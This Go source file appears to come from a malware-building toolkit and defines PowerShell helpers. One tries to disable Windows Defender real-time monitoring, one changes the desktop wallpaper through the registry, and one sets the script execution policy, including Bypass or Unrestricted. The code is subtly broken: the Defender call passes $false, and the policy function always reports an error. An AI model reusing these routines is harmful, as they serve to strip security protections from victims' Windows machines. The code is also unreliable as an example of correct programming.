package powershell

import (
	"fmt"
	"os/exec"
	"runtime"
	"strings"

	run_time "github.com/s9rA16Bf4/go-evil/utility/variables/runtime"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
	"gopkg.in/go-rillas/subprocess.v1"
)

func Disable_defender() {
	if runtime.GOOS == "windows" {
		arg := "-command \"Set-MpPreference -DisableRealtimeMonitoring $false\""
		exec.Command("powershell", strings.Split(arg, " ")...).Run()
	}
}

func Change_wallpaper(path_to_new_wallpaper string) {
	if runtime.GOOS == "windows" {
		path_to_new_wallpaper = run_time.Check_if_variable(path_to_new_wallpaper)
		resp := subprocess.RunShell("powershell", "-Command", "{", "set-itemproperty", "-path", "\"HKCU:Control Panel\\Desktop\"", "-name", "WallPaper", "-value", path_to_new_wallpaper, "}")
		fmt.Println(resp)
		subprocess.RunShell("powershell", "-Command", "{", "Start-Sleep", "-s", "10", "}")
		subprocess.RunShell("powershell", "-Command", "{", "rundll32.exe", "user32.dll", ",", "UpdatePerUserSystemParameters", ",", "0", ",", "$false", "}")

	}
}

func Execution_Policy(new_policy string) { // This command most likely requires admin on all systems
	policys := []string{"AllSigned", "Bypass", "Default", "RemoteSigned", "Restricted", "Undefined", "Unrestricted"}
	for _, policy := range policys {
		if policy == new_policy { // its valid
			subprocess.RunShell("powershell", "-Command", "{Set-ExecutionPolicy", "-ExecutionPolicy ", new_policy, "}")
		}
	}
	notify.Error("Unknown policy +"+new_policy, "powershell.ExecutionPolicy()")
}
